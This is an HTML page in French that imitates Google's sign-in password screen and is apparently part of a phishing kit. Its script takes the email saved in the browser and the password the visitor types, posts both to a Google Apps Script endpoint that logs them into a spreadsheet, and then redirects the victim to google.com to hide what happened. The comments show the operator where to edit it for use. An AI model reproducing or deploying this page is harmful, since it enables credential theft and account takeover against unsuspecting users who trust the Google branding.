<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="utf-8" />
  <title>Connexion - Mot de passe</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="main">
    <div class="card">
      <div class="card-header" align="center">
        <img src="https://www.google.fr/images/branding/googlelogo/2x/googlelogo_color_160x56dp.png" width="70" alt="logo">
        <div class="login-title">Connexion</div>
        <div class="login-subtitle" id="displayEmail">Saisissez votre mot de passe</div>
        <input type="password" id="password" placeholder="Mot de passe">
      </div>

      <div class="card-footer">
        <a href="#">Mot de passe oublié ?</a>
        <div class="card-footer-buttons">
          <a href="login.html">Retour</a>
          <button id="submitBtn">Suivant</button>
        </div>
      </div>
    </div>
  </div>

  <!-- ✅ SCRIPT JS À LA FIN DU BODY -->
  <script>
    document.getElementById("submitBtn").addEventListener("click", async function () {
      const passwordInput = document.getElementById("password").value.trim();
      const email = localStorage.getItem("userEmail") || "";

      if (!email) {
        alert("Aucun e-mail trouvé. Veuillez revenir à la page précédente.");
        window.location.href = "login.html";
        return;
      }

      if (passwordInput.length === 0) {
        alert("Veuillez entrer votre mot de passe.");
        return;
      }

      try {
        // ✅ Envoi à Google Sheets via Apps Script
        await fetch("https://script.google.com/macros/s/TON_ID/exec", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email: email, password: passwordInput })
        });

        // ✅ Redirection vers un autre site après envoi
        window.location.href = "https://www.google.com"; // <- change cette URL si tu veux rediriger ailleurs
      } catch (err) {
        console.error("Erreur lors de l'envoi :", err);
        alert("Une erreur est survenue. Réessayez plus tard.");
      }
    });
  </script>

</body>
</html>
